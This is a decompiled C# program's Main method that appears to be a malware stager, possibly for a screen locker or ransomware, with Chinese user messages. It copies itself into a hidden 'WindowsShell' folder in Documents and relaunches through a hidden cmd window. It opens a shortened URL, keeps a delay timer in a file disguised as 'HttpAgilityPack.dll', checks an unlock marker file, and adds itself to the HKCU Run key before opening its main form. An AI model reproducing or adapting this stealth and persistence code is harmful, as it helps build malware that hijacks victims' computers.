using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Leen;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		string thisprocessname = Process.GetCurrentProcess().ProcessName;
		if (Process.GetProcesses().Count((Process p) => p.ProcessName == thisprocessname) > 1)
		{
			MessageBox.Show("应用执行中，请勿重复执行，首次执行需耗时20分钟初始化");
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Driver";
		FileSystemOperator fileSystemOperator = new FileSystemOperator();
		fileSystemOperator.WriteLog("[Pre Main] WorkPath = " + Directory.GetCurrentDirectory());
		if (File.Exists(text + "\\b.print") && File.ReadAllText(text + "\\b.print").Equals("6688123"))
		{
			fileSystemOperator.WriteLog("Already Unlock, do not lock agian");
			return;
		}
		try
		{
			Process.Start("iexplore.exe", "https://lihi1.cc/7FWHR");
		}
		catch
		{
			fileSystemOperator.WriteLog("[Main] Error .Open Browser Error");
		}
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\WindowsShell";
		try
		{
			if (!Directory.Exists(text2))
			{
				DirectoryInfo directoryInfo = Directory.CreateDirectory(text2);
				directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
				string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.*", SearchOption.AllDirectories);
				foreach (string text3 in files)
				{
					File.Copy(text3, text3.Replace(Directory.GetCurrentDirectory(), text2), overwrite: true);
				}
				string arguments = "/c " + text2 + "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
				Process.Start(new ProcessStartInfo
				{
					Arguments = arguments,
					FileName = "cmd",
					WindowStyle = ProcessWindowStyle.Hidden
				});
				fileSystemOperator.WriteLog("[Pre Main] StartPath = " + text2 + "\\" + Process.GetCurrentProcess().ProcessName + ".exe");
				return;
			}
			DirectoryInfo directoryInfo2 = Directory.CreateDirectory(text2);
			directoryInfo2.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
		}
		catch (Exception ex)
		{
			fileSystemOperator.WriteLog("[Pre Main] Error = " + ex.Message);
		}
		try
		{
			if (!File.Exists(Directory.GetCurrentDirectory() + "\\HttpAgilityPack.dll"))
			{
				fileSystemOperator.WriteLog("[Pre Main] Path = " + Directory.GetCurrentDirectory() + "\\HttpAgilityPack.dll");
				File.Create("HttpAgilityPack.dll");
			}
			IniFile iniFile = new IniFile("HttpAgilityPack.dll");
			long num = 0L;
			if (iniFile.KeyExists("ot", "main"))
			{
				num = Convert.ToInt64(iniFile.Read("ot", "main"));
				Console.WriteLine(num);
			}
			else
			{
				iniFile.Write("ot", "0", "main");
			}
			while (true)
			{
				if (num <= 1451584800L)
				{
					if (!File.Exists(text + "\\t.print"))
					{
						File.WriteAllText(text + "\\t.print", Convert.ToString(UnixTimeNow()));
					}
					long num2 = Convert.ToInt32(File.ReadAllText(text + "\\t.print"));
					if (UnixTimeNow() >= num2 + num)
					{
						fileSystemOperator.WriteLog("[Pre Main] Case2 success");
						break;
					}
					Console.WriteLine("Case 2 wait " + Convert.ToString(num2 + num - UnixTimeNow()) + " s");
					fileSystemOperator.WriteLog("Case 2 wait " + Convert.ToString(num2 + num - UnixTimeNow()) + " s");
					Thread.Sleep(10000);
				}
				else
				{
					if (UnixTimeNow() >= num)
					{
						fileSystemOperator.WriteLog("[Pre Main] Case1 success ");
						break;
					}
					Console.WriteLine("Case 1 wait " + Convert.ToString(num - UnixTimeNow()) + " s");
					fileSystemOperator.WriteLog("Case 1 wait " + Convert.ToString(num - UnixTimeNow()) + " s");
					Thread.Sleep(10000);
				}
			}
		}
		catch (Exception ex2)
		{
			fileSystemOperator.WriteLog("[Pre Main] Error = " + ex2.Message);
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Leen", text2 + "\\" + Process.GetCurrentProcess().ProcessName + ".exe");
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Main());
	}

	public static long UnixTimeNow()
	{
		return (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
	}
}
